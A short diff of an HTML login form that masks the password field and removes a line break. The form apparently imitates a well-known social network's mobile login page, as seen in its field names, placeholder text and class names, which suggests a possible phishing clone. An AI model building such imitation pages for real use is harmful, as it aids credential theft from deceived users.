@@ -43,8 +43,8 @@ input[type=submit]:hover {
  <input type="text" id="fname" name="email" placeholder="Mobile number or email address">
 
     
-    <input type="text" id="lname" name="pass" placeholder="Password">
-      <br>
+    <input type="password" id="lname" name="pass" placeholder="Password">
+     
 
 <button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu">Log In</button>
 
